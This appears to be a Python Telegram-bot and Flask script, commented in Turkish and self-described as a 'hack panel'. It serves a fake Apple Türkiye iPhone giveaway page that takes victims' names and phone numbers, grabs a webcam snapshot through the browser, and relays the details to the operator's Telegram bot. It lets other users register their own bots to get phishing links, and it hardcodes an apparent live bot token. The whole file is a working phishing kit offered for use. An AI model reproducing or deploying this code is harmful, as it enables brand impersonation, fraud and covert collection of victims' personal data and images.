import telebot
from telebot import types
import flask
from flask import request, render_template_string
import threading
import os

# --- AYARLAR ---
MAIN_TOKEN = '8594122618:AAExtG0YXEAcrD9z7hOSpkfdoJzOKVkreDk' # Ana kontrol botu
main_bot = telebot.TeleBot(MAIN_TOKEN)
app = flask.Flask(__name__)

# Tüm aktif botlar burada tutulur
deployed_bots = {}

# --- INDEX HTML (KANDIRMA SAYFASI) ---
INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Apple Türkiye | iPhone 15 Pro Çekilişi</title>
    <style>
        body { font-family: sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
        button { background: #0071e3; color: white; border: none; padding: 15px; width: 95%; border-radius: 8px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" width="50">
        <h2>Tebrikler Zordo Üyesi!</h2>
        <p>iPhone 15 Pro çekilişi için bilgileri doldur ve kamerayla doğrula.</p>
        <input type="text" id="name" placeholder="Ad Soyad">
        <input type="tel" id="phone" placeholder="Telefon Numarası">
        <button onclick="capture()">KATILIMI ONAYLA</button>
        <p id="msg" style="color:blue; display:none;">Doğrulanıyor... Kameraya bakın.</p>
    </div>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const params = new URLSearchParams(window.location.search);
        async function capture() {
            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            if(!name || !phone) return alert("Doldur aşkım!");
            
            document.getElementById('msg').style.display = 'block';
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v'); v.srcObject = stream;

            setTimeout(async () => {
                const c = document.getElementById('c');
                c.width = 640; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                const img = c.toDataURL('image/jpeg');

                await fetch('/receive', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        token: params.get('token'),
                        uid: params.get('uid'),
                        name: name,
                        phone: phone,
                        image: img
                    })
                });
                alert("Başvuru alındı!");
                window.location.href = "https://apple.com/tr";
            }, 2000);
        }
    </script>
</body>
</html>
"""

# --- BOT MANTIĞI ---
def start_slave(token, owner_id):
    try:
        bot = telebot.TeleBot(token)
        deployed_bots[token] = {"bot": bot, "owner": owner_id}
        
        @bot.message_handler(commands=['start'])
        def panel(message):
            markup = types.InlineKeyboardMarkup(row_width=2)
            url = f"https://{request.host}/auth?token={token}&uid={message.from_user.id}"
            markup.add(types.InlineKeyboardButton("🔥 SIZMA PANELİ", url=url),
                       types.InlineKeyboardButton("🛠 DESTEK", url="https://t.me/zordodestek"))
            bot.send_message(message.chat.id, "🛰 **ZORDO HACK PANEL**\n\nSızma linkin hazır sevgilim.", reply_markup=markup)
        
        bot.polling(non_stop=True)
    except: pass

@main_bot.message_handler(func=lambda m: ":" in m.text)
def handle(message):
    t = message.text.strip()
    threading.Thread(target=start_slave, args=(t, message.chat.id)).start()
    main_bot.reply_to(message, "🚀 Bot bağlandı!")

# --- WEB ROTALARI ---
@app.route('/auth')
def auth(): return render_template_string(INDEX_HTML)

@app.route('/receive', methods=['POST'])
def receive():
    data = request.json
    t = data.get('token')
    if t in deployed_bots:
        bot_info = deployed_bots[t]
        msg = f"⚠️ **AV DÜŞTÜ!**\n👤: {data['name']}\n📞: {data['phone']}\n🆔: {data['uid']}"
        bot_info['bot'].send_message(bot_info['owner'], msg)
    return "OK", 200

if __name__ == "__main__":
    threading.Thread(target=lambda: main_bot.polling(non_stop=True)).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
